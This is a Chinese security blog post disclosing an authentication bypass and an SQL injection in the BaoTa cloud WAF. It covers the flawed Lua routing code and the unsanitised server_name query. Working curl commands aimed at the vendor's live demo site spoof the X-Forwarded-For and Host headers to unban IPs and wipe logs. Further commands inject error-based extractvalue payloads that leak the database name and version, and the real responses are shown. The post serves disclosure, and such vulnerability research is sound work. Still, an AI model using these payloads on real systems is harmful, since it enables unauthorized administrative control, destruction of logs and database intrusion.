#  宝塔最新未授权访问漏洞及SQL注入   
Palvef  SecHub网络安全社区   2024-02-17 14:49  
  
****  
****  
**点击蓝字 关注我们**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8icWLyUKibZZrPdaxnm18Zscp6Xcu0OiaMwuh8LP87lPQLxMwiceAsv3TurmE7zZOulOhMELnQ2OulwFIJkbmB3bRg/640?wx_fmt=png "")  
  
  
**免责声明**  
  
本文发布的工具和脚本，仅用作测试和学习研究，禁止用于商业用途，不能保证其合法性，准确性，完整性和有效性，请根据情况自行判断。  
  
如果任何单位或个人认为该项目的脚本可能涉嫌侵犯其权利，则应及时通知并提供身份证明，所有权证明，我们将在收到认证文件后删除相关内容。  
  
文中所涉及的技术、思路及工具等相关知识仅供安全为目的的学习使用，任何人不得将其应用于非法用途及盈利等目的，间接使用文章中的任何工具、思路及技术，我方对于由此引起的法律后果概不负责。  
  
**添加星标不迷路**  
  
由于公众号推送规则改变，微信头条公众号信息会被折叠，为了避免错过公众号推送，请大家动动手指设置“星标”，设置之后就可以和从前一样收到推送啦![](https://mmbiz.qpic.cn/mmbiz_png/8icWLyUKibZZpS5DUGyysHFIqk1y4gACPd3bhtalBhNiceUuPGYOqKMhP6rqnrvW8VAzDrKU9rWmV5KUdloSxS3HA/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8icWLyUKibZZrAHDA4Yuac4FTs6eXaibCrsBhpIBJDSXejicckHItLxyznNXfHrueMuaNmpcaQYV3YNyRJJ9kWyvyA/640?wx_fmt=png "")  
  
## 未授权访问  
  
### 01 前言  
  
整个宝塔 WAF 核心防护功能的代码写的确实有点粗糙，代码组织方式不像一个成熟软件该有的架构，小 Bug 一眼望不到头，今天分享的是一个未授权访问漏洞，普通用户可以无视宝塔的随机登录地址，无视宝塔的登录密码，直接操作后台的数据，实现人人都是管理员的效果。  
  
### 02 原理  
```
start = function ()
  ... 此处身略若干行
  if ngx.var.remote_addr == "127.0.0.1" and ngx.ctx.Server_name == "127.0.0.251" and ngx.var.host == "127.0.0.251" then
    if ngx.var.uri == "/get_btwaf_drop_ip" then
      Public.return_message(200, uv0.get_btwaf_drop_ip())
    elseif ngx.var.uri == "/remove_btwaf_drop_ip" then
      Public.return_message(200, uv0.remove_btwaf_drop_ip())
    elseif ngx.var.uri == "/clean_btwaf_drop_ip" then
      Public.return_message(200, uv0.clean_btwaf_drop_ip())
    elseif ngx.var.uri == "/updateinfo" then
      Public.return_message(200, uv0.updateInfo())
    elseif ngx.var.uri == "/get_site_status" then
      Public.return_message(200, uv0.get_site_status())
    elseif ngx.var.uri == "/get_global_status" then
      Public.return_message(200, uv0.get_global_status())
    end

    if ngx.var.uri == "/clean_btwaf_logs" then
      Public.return_message(200, uv0.clean_btwaf_logs())
    end

    if ngx.var.uri == "/clear_speed_hit" then
      Public.return_message(200, uv0.clear_speed_hit())
    end

    if ngx.var.uri == "/clear_replace_hit" then
      Public.return_message(200, uv0.clear_replace_hit())
    end

    if ngx.var.uri == "/reset_customize_cc" then
      Public.return_message(200, uv0.reset_customize_cc())
    end

    if ngx.var.uri == "/clear_speed_countsize" then
      Public.return_message(200, uv0.clear_speed_countsize())
    end
  end
end
```  
  
上面这段代码位于   
/cloud_waf/nginx/conf.d/waf/public/waf_route.lua  
 文件中，源文件是   
luajit  
 编译后的内容，反编译一下即可看到源码。  
  
看代码最开端的 if 语句，只要满足 ip 是   
127.0.0.1  
 ，域名是   
127.0.0.251  
 这两个条件就能在不用登录的情况下访问下面的 API 。  
  
话说这是临时工写的代码吧，对于宝塔的配置来说，要满足这两个条件很难吗？  
  
配置   
x-forwarded-for  
 头为   
127.0.0.1  
 即可满足 ip 是   
127.0.0.1  
 的条件  
  
 配置   
host  
 头为   
127.0.0.251  
 即可满足域名是   
127.0.0.251  
 的条件  
  
 提供一条 curl 参数供大家参考  
```
curl 'http://宝塔地址/API'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
```  
  
到此漏洞原理就讲完了  
  
### 03 测试漏洞  
  
我们访问宝塔官方网站做个测试  
  
**get_btwaf_drop_ip**  
  
这个 API 用来获取已经拉黑的 IP 列表，使用以下命令发起访问  
```
curl 'http://btwaf-demo.bt.cn/get_btwaf_drop_ip'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
```  
  
**remove_btwaf_drop_ip**  
  
这个 API 用来解封 IP ，提供一个 get 参数即可，使用以下命令发起访问  
```
curl 'http://btwaf-demo.bt.cn/remove_btwaf_drop_ip?ip=1.2.3.4'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
```  
  
响应如下  
```
{"msg":"1.2.3.4 已解封","status":true}
```  
  
**clean_btwaf_drop_ip**  
  
这个 API 用来解封所有 IP ，使用以下命令发起访问  
```
curl 'http://btwaf-demo.bt.cn/clean_btwaf_drop_ip'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
```  
  
响应如下  
```
{"msg":"已解封所有 IP","status":true}
```  
```
```  
  
**updateinfo**  
  
这个 API 看起来是更新配置用的，需要一个 types 参数做校验，但实际并没有什么用处，使用以下命令发起访问  
```
curl 'http://btwaf-demo.bt.cn/updateinfo?types'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
```  
  
**get_site_status**  
  
这个 API 用来获取网站的配置，server_name 参数需要提供网站的域名，使用以下命令发起访问  
```
curl 'http://btwaf-demo.bt.cn/get_site_status?server_name=bt.cn'  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
```  
  
响应如下  
```
{"status":true,"msg":{"uv":0,"qps":0,"inland":0,"overseas":0,"today":{"pc_count":0,"mobile_count":0,"req":0,"spider_google":0,"spider_bing":0,"spider_sogou":0,"spider_360":0,"spider_other":0,"err_40x":0,"spider_baidu":0,"recv_bytes":0,"send_bytes":0,"err_500":0,"err_502":0,"err_503":0,"err_504":0,"err_499":0,"uv_count":0,"ip_count":0,"pv_count":0},"send_bytes":0,"proxy_count":0,"err_502":0,"recv_bytes":0,"err_504":0,"err_499":0,"ip":0,"proxy_time":0,"pv":0}}
```  
  
**clean_btwaf_logs**  
  
这个 API 用来删除宝塔的所有日志，使用以下命令发起访问  
```
curl "http://btwaf-demo.bt.cn/clean_btwaf_logs"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
```  
  
后续还有一些 API 大同小异，不一一列举了  
  
**get_global_status**  
  
**clear_speed_hit**  
  
**clear_replace_hit**  
  
**reset_customize_cc**  
  
**clear_speed_countsize**  
  
****## 04 SQL注入  
  
接上篇，在测试宝塔 WAF 的未授权访问漏洞时无意间还发现了一个 SQL 注入漏洞，品相还不错，可执行任意 SQL 语句。  
  
总之，吃了一惊，一个防 SQL 注入的工具居然也有 SQL 注入漏洞。  
  
请看这段代码  
```
get_site_status = function ()
  if not ngx.ctx.get_uri_args.server_name then
    return Public.get_return_state(false, "参数错误")
  end

  ... 此处省略若干代码

  slot7, slot8, slot9, slot10 = slot4.query(slot4, [[
SELECT 
    SUM(request) as req,
    SUM(err_40x) as err_40x,
    SUM(err_500) as err_500,
    SUM(err_502) as err_502,
    SUM(err_503) as err_503,
    SUM(err_504) as err_504,
    SUM(err_499) as err_499,
    SUM(send_bytes) as send_bytes,
    SUM(receive_bytes) as recv_bytes,
    SUM(pc_count) as pc_count,
    SUM(mobile_count) as mobile_count,
    SUM(spider_baidu) as spider_baidu,
    SUM(spider_google) as spider_google,
    SUM(spider_bing) as spider_bing,
    SUM(spider_360) as spider_360,
    SUM(spider_sogou) as spider_sogou,
    SUM(spider_other) as spider_other,
    SUM(ip_count) as ip_count,
    SUM(pv_count) as pv_count,
    SUM(uv_count) as uv_count
     FROM `request_total` WHERE `server_name`=']] .. slot1 .. "' AND `date`='" .. os.date("%Y-%m-%d") .. "'")

  ... 此处省略若干代码

  return Public.get_return_state(true, slot6)
end
```  
  
这段代码位于   
/cloud_waf/nginx/conf.d/waf/public/waf_route.lua  
 文件中，源文件是   
luajit  
 编译后的内容，反编译一下即可看到源码  
  
这段逻辑就在上文提到的   
**get_site_status**  
 API 中，slot1 变量就是   
server_name  
 参数。原理很简单，  
server_name  
 参数没有做任何校验就直接带入了 SQL 查询。  
  
宝塔官网还没有修复这个问题，还是拿宝塔官网为例，试试以下命令：  
```
curl "http://btwaf-demo.bt.cn/get_site_status?server_name='-extractvalue(1,concat(0x5c,database()))-'"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
```  
  
响应如下  
```
{"status":false,"msg":"数据查询失败: XPATH syntax error: '\\btwaf': 1105: HY000."}
```  
  
从响应来看已经注入成功，通过 updatexml 的报错成功的爆出了库名叫 **btwaf**  
  
继续执行以下命令：  
```
curl "http://btwaf-demo.bt.cn/get_site_status?server_name='-extractvalue(1,concat(0x5c,version()))-'"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
```  
  
响应如下  
```
{"status":false,"msg":"数据查询失败: XPATH syntax error: '\\8.1.0': 1105: HY000."}
```  
  
从响应来看，mySQL 版本是 8.1.0  
  
在继续执行以下命令  
```
curl "http://btwaf-demo.bt.cn/get_site_status?server_name='-extractvalue(1,concat(0x5c,(select'hello,world')))-'"  -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: 127.0.0.251'
```  
  
响应如下  
```
{"status":false,"msg":"数据查询失败: XPATH syntax error: '\\hello,world': 1105: HY000."}
```  
  
看起来 **select ‘hello,world’** 也执行成功了，到此为止，基本可以执行任意命令。  
  
  
漏洞已通报给宝塔官方，此漏洞危害较大，各位宝塔用户请关注宝塔官方补丁，及时更新。  
  
  
**感谢**  
**Palvef****师傅投稿！**  
  
  
  
欢迎关注SecHub网络安全社区，SecHub网络安全社区目前邀请式注册，邀请码获取见公众号菜单【邀请码】  
  
**#**  
  
  
**企业简介**  
  
  
**赛克艾威 - 网络安全解决方案提供商**  
  
****  
       北京赛克艾威科技有限公司（简称：赛克艾威），成立于2016年9月，提供全面的安全解决方案和专业的技术服务，帮助客户保护数字资产和网络环境的安全。  
  
  
安全评估|渗透测试|漏洞扫描|安全巡检  
  
代码审计|钓鱼演练|应急响应|安全运维  
  
重大时刻安保|企业安全培训  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8icWLyUKibZZrPdaxnm18Zscp6Xcu0OiaMwuh8LP87lPQLxMwiceAsv3TurmE7zZOulOhMELnQ2OulwFIJkbmB3bRg/640?wx_fmt=png "")  
  
  
**联系方式**  
  
电话｜010-86460828   
  
官网｜https://sechub.com.cn  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0FW5uwU0BZtn2lmMrLPwpibCeCVbtBFDRkbFb7n7ibhPRxg20spUo9mUIiakmRYABB88Idl81IpGuXfw/640?wx_fmt=gif "")  
  
**关注我们**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SUZ43ICubr4mWJcUARDKYbQooQjbjbmqZTerAIXqDX9CaVxXbB7pyWwnMRklrCJias9r59PhnJAxZ4e3gYjyqVQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SUZ43ICubr4mWJcUARDKYbQooQjbjbmqZTerAIXqDX9CaVxXbB7pyWwnMRklrCJias9r59PhnJAxZ4e3gYjyqVQ/640?wx_fmt=png "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/8icWLyUKibZZrPdaxnm18Zscp6Xcu0OiaMwyhlWCYDVqK38BA5dbjKkH7icWmAew7SYRA7ao1bFibialrMvmQ9ib0TBvw/640?wx_fmt=jpeg "")  
  
  
**公众号：**sechub安全  
  
**哔哩号：**SecHub官方账号  
  
  
